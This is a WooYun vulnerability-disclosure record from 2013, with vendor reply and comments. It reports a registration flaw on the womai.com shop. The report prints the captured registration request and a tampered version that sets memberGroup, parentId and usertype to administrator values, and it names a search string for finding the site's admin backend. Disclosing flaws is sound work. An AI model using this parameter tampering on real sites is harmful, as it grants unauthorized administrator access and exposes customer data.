{"id": 12261, "wybug_id": "wooyun-2013-022676", "wybug_title": "中粮我买网设计缺陷", "wybug_corp": "中粮我买网", "wybug_author": "刺刺", "wybug_date": "2013-04-29 01:57", "wybug_open_date": "2013-06-13 01:58", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-13：\t细节向公众公开  简要描述： 中粮我买网某功能存在设计缺陷，可提权，提很高的权限。 详细说明：  我买网用户注册功能存在设计缺陷，普通用户可以注册成系统管理员。1. 使用Fiddle抓包，用户注册过程最终得到以下链接：http://www.womai.com/Cart/Register.do?parendId=&Email=sex%2540126.com&loginId=foxxx&password=sexsex11&password2=sexsex11&invitationCode=&know_womai=%25E6%259C%258B%25E5%258F%258B%25E4%25BB%258B%25E7%25BB%258D&know_womai=%25E6%2590%259C%25E7%25B4%25A2%25E5%25BC%2595%25E6%2593%258E&know_womai=%25E4%25BF%2583%25E9%2594%2580%25E5%258D%2595&know_womai=%25E8%25AE%25BA%25E5%259D%259B&know_womai=%25E6%2596%25B0%25E9%2597%25BB&know_womai=%25E5%2585%25B6%25E4%25BB%2596&validateCode=au6q&=on&providerName=userRegistExtentionAttribute&memberGroup=100&parentId=&mid=0&usertype=&returnUrl=&callback=jsonp1367119154807&_=1367119289017解释以下上面的部分内容：parendId= 商家代码Email=sex%2540126.com&loginId=foxxx&password=assssssa&password2=assssssa 注册的邮箱、用户名和密码validateCode 验证码memberGroup=100   用户组#1是管理员组parentId=   商家代码 #0是系统usertype=  用户类型 #1是管理员根据以上匹配，重新提交请求：http://www.womai.com/Cart/Register.do?parendId=0&Email=sex%2540126.com&loginId=foxxx&password=sexsex11&password2=sexsex11&invitationCode=&know_womai=%25E6%259C%258B%25E5%258F%258B%25E4%25BB%258B%25E7%25BB%258D&know_womai=%25E6%2590%259C%25E7%25B4%25A2%25E5%25BC%2595%25E6%2593%258E&know_womai=%25E4%25BF%2583%25E9%2594%2580%25E5%258D%2595&know_womai=%25E8%25AE%25BA%25E5%259D%259B&know_womai=%25E6%2596%25B0%25E9%2597%25BB&know_womai=%25E5%2585%25B6%25E4%25BB%2596&validateCode=au6q&=on&providerName=userRegistExtentionAttribute&memberGroup=1&parentId=0&mid=0&usertype=1&returnUrl=&callback=jsonp1367119154807&_=1367119289017你就可以注册成功了。   漏洞证明：  现在登录后台：特别感谢搜狗，使用搜狗搜索\"/OurHome/core\",可以很容易的找到我买网的后台。我登录了一下，截图退出。\n\n管理员列表：\n\n   修复方案：  这个问题可能会影响广州信景的很多客户，建议联系厂商。建议厂商对早期版本的客户及时修补，因为早期的版本还有其他的安全问题，比这个简单且威力大。   版权声明：转载请注明来源 刺刺@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2013-04-29 20:07 厂商回复： 感谢洞主！！我们尽快安排修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-29 20:58 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:41        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  rank刚好，又成普通帽子啦！～～    \n     2013-05-03 10:27 |    \t\t中粮我买网(乌云厂商)\t\t \n  @刺刺 哈哈。。欢迎继续挖洞。。我们的礼物还是算给力哦亲～～  你懂得。稍后礼物奉上。    \n     2013-05-31 17:08 |    \t\tAepl│恋爱 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:15        | Forzen恋爱-不要做你的Guest 只想做的你adm...)\t\t \n  @中粮我买网 13分少了点    \n     2013-05-31 17:22 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:41        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  @Aepl│恋爱 多谢关注，厂商已经在另外一个漏洞中做了补偿。那个漏洞也就1 rank，厂商给了13 rank 呵呵    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}